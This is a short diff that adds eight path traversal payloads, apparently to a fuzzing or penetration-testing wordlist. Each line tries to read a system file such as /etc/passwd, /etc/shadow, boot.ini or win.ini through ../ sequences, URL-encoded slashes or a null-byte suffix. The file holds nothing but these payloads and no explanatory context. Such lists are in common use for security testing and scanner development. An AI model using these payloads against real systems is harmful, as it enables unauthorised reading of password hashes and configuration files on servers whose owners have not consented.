@@ -1,0 +1,8 @@
+../../../../../../etc/passwd
+../../../../../../boot.ini
+../../../../../../windows/win.ini
+../../../../../../etc/shadow
+..%2f..%2f..%2f..%2fetc%2fpasswd
+/etc/passwd%00
+C:\boot.ini
+../../../../../../dev/null
